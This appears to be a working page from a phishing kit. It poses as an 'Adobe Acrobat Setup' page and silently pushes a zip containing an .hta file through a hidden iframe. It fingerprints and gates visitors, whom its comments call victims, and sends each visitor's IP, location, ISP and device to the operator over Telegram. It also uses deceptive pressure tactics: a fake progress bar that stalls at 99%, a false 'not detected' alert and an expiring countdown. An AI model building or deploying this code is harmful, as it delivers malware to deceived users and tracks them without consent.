<?php
require __DIR__ . '/../lib.php';

// Step 3: must arrive from download.php, full Chrome fingerprint.
// The load is scripted (2s spinner setTimeout), so Chrome sends
// Sec-Fetch-User: ?0 even for a human click — requireUser must stay
// false here or every real victim 404s. Pacing is enforced by minAge.
gate_doc(['/download.php'], 4, false);

$name = (string)($_GET['n'] ?? '');
if ($name === '' || preg_match('/[^A-Za-z0-9_. -]/', $name)) { $name = make_name(); }
$name = substr($name, 0, 90);
if (!str_ends_with($name, '.hta')) { $name .= '.hta'; }
$tok  = check_token($_GET['tk'] ?? null);
$kind = name_kind($name);

$tk    = rawurlencode($_GET['tk']);
$nameQ = rawurlencode($name);
$zipBase = preg_replace('/\.hta$/i', '', $name);

// Instruction is variant-aware: "to install" for Adobe names,
// "to view your document" for document names. Points at Windows 11
// File Explorer "Recent", where fresh downloads land first.
$instr = ($kind === 'adobe')
    ? 'Open <strong>' . htmlspecialchars($zipBase . '.zip') . '</strong> in <strong>Recent</strong> (File Explorer), open it, and run the file inside to install.'
    : 'Open <strong>' . htmlspecialchars($zipBase . '.zip') . '</strong> in <strong>Recent</strong> (File Explorer), open it, and run the file inside to view your document.';

// ---- one Telegram alert per visit (deduped by token nonce) ----
$key = ALERT_DIR . '/al_' . md5($tok['r'] . '|' . $name) . '.fired';
if (!@file_exists($key)) {
    @touch($key);
    $g   = geo(ip());
    $msg = "\x{1F3AF} New Download Triggered \x{1F3AF}\n"
         . "\x{1F4C5} Time: " . date('Y-m-d H:i:s') . "\n"
         . "\x{1F4CD} IP: " . ip() . "\n"
         . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
         . "\x{1F310} ISP: " . $g['isp'] . "\n"
         . "\x{1F4C1} File: " . $name . "\n"
         . "\x{1F4F1} Device: " . ua()
         . verdict_line($tok);
    tg($msg);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Adobe Plugin Required</title>
  <style>
    body {
      font-family: Arial, sans-serif; margin: 0; min-height: 100vh;
      display: flex; align-items: flex-start; justify-content: center;
      background-color: #f5f5f5; padding-top: 10vh;
    }
    .container { text-align: center; max-width: 620px; margin-top: 0; }
    img { width: 150px; margin-bottom: 18px; }
    a { color: #d32f2f; text-decoration: none; font-weight: bold; }
    a:hover { text-decoration: underline; }
    p { line-height: 1.6; margin: 0; padding: 0 10px; }
    .title { font-size: 22px; font-weight: bold; color: #2b2b2b; margin-bottom: 6px; }
    .sub { font-size: 13px; color: #666; margin-bottom: 22px; }
    .btn {
      display: inline-block; background: #d32f2f; color: #fff;
      font-size: 17px; font-weight: bold; padding: 14px 34px;
      border: none; border-radius: 4px; cursor: pointer;
      box-shadow: 0 2px 6px rgba(0,0,0,0.25);
    }
    .btn:hover { background: #b71c1c; }
    .btn:active { transform: translateY(1px); }
    .bar { width: 420px; max-width: 90%; height: 8px; background: #e0e0e0;
           border-radius: 4px; margin: 20px auto 6px; overflow: hidden; }
    .bar .fill { height: 100%; width: 4%; background: #d32f2f; border-radius: 4px;
                 transition: width 0.8s linear; }
    #status { font-size: 13px; color: #757575; min-height: 20px; margin-bottom: 14px; }
    #alert {
      display: none; background: #fff3e0; border: 1px solid #ffcc80;
      color: #e65100; font-size: 14px; padding: 12px 16px; border-radius: 4px;
      margin: 0 0 18px; max-width: 560px; margin-left: auto; margin-right: auto;
    }
    .manual { font-size: 12.5px; color: #666; margin-top: 16px; }
  </style>
</head>
<body>
  <div class="container">
    <img src="assets/adobeicon.png" alt="Adobe Icon">
    <div class="title">Adobe Acrobat Setup</div>
    <div class="sub">Your download is ready. One step left to finish installing.</div>
    <div id="alert">
      <strong>Setup has not started yet.</strong><br>
      Adobe Acrobat has not been detected on this computer.
      Click <strong>Open Adobe Acrobat Installer</strong> below to run your download.
    </div>
    <button class="btn" id="go" type="button">&#128194;&nbsp; Open Adobe Acrobat Installer</button>
    <div class="bar"><div class="fill" id="fill"></div></div>
    <div id="status">Preparing your installation&hellip;</div>
    <p class="manual">
      <?php echo $instr; ?><br>
      Download not working? <a href="dl.php?tk=<?php echo $tk; ?>&n=<?php echo $nameQ; ?>">Download manually</a>
      &nbsp;|&nbsp; <a href="#" id="retrigger">&#8635; Restart and Download | Get Help</a>
    </p>
  </div>

  <!-- Hidden iframe to trigger the actual (fresh-name, unique-hash) download.
       Sec-Fetch-Dest: iframe, no Sec-Fetch-User — exactly what gate_dl() expects.
       retriggerDownload() re-injects this same style of iframe (cache-busted). -->
  <iframe src="dl.php?tk=<?php echo $tk; ?>&n=<?php echo $nameQ; ?>" style="display:none;" onload="this.remove();"></iframe>

  <script>
    // ------------------------------------------------------------------
    // Patient-installer nag. The download already started (hidden iframe
    // above). This keeps re-urging the user to actually RUN the installer
    // while the tab is open: escalating status copy, a progress bar that
    // creeps up but never completes, a "not detected" alert, and an
    // expiring-session countdown. Every button re-fires the download.
    // ------------------------------------------------------------------
    var dlUrl  = "dl.php?tk=<?php echo $tk; ?>&n=<?php echo $nameQ; ?>";
    var btn    = document.getElementById("go");
    var status = document.getElementById("status");
    var fill   = document.getElementById("fill");
    var alertB = document.getElementById("alert");
    var t0     = Date.now();
    var phase  = 0;
    var pct    = 4;
    var cd     = null;            // countdown timer
    var cdLeft = 600;             // 10:00
    var cdShown = false;

    function fireDownload() {
      // Re-inject the hidden iframe (cache-busted) so the browser fetches a
      // fresh per-download zip again. Same iframe headers the first one used.
      var f = document.createElement("iframe");
      f.style.display = "none";
      f.src = dlUrl + "&r=" + Date.now();
      f.onload = function () { setTimeout(function () { f.remove(); }, 2000); };
      document.body.appendChild(f);
      status.innerHTML = "Starting your installer download&hellip; check your <strong>Downloads</strong>.";
      setTimeout(function () {
        status.innerHTML = "Installation not started yet? Make sure you opened the file from your <strong>Downloads</strong> folder.";
      }, 8000);
    }

    btn.onclick = fireDownload;
    document.getElementById("retrigger").onclick = function (e) {
      e.preventDefault();
      fireDownload();
      window.scrollTo(0, 0);
    };

    // Creep the progress bar: climbs for the first ~90s, then stalls at 99%.
    setInterval(function () {
      var el = (Date.now() - t0) / 1000;
      if (el < 90) {
        pct = Math.min(97, pct + 0.35 + Math.random() * 0.4);
      } else if (el < 120 && pct < 99) {
        pct = 99;
      }
      fill.style.width = pct + "%";
    }, 1000);

    // Escalation timeline.
    var steps = [
      [12000,  "Waiting for the installer to start&hellip;"],
      [30000,  "Still preparing&hellip; this computer doesn't have the latest Adobe plugin."],
      [60000,  "Adobe Acrobat has not started on this computer."],
      [90000,  "Setup pending. Click <strong>Open Adobe Acrobat Installer</strong> to continue."]
    ];
    steps.forEach(function (s) {
      setTimeout(function () {
        phase++;
        if (phase >= 2) alertB.style.display = "block";
        status.innerHTML = s[1];
        if (phase === 3) document.title = "Action Required — Adobe Acrobat";
        if (phase === 4) startCountdown();
      }, s[0]);
    });

    function startCountdown() {
      cdShown = true;
      cd = setInterval(function () {
        cdLeft--;
        var m = Math.floor(Math.max(0, cdLeft) / 60);
        var s = Math.max(0, cdLeft) % 60;
        alertB.innerHTML =
          "<strong>Your download will expire in " + m + ":" + (s < 10 ? "0" : "") + s +
          ".</strong><br>Complete your installation now to keep your file." +
          (cdLeft <= 0 ? "<br><em>Expired files cannot be re-downloaded.</em>" : "");
      }, 1000);
    }
  </script>
</body>
</html>
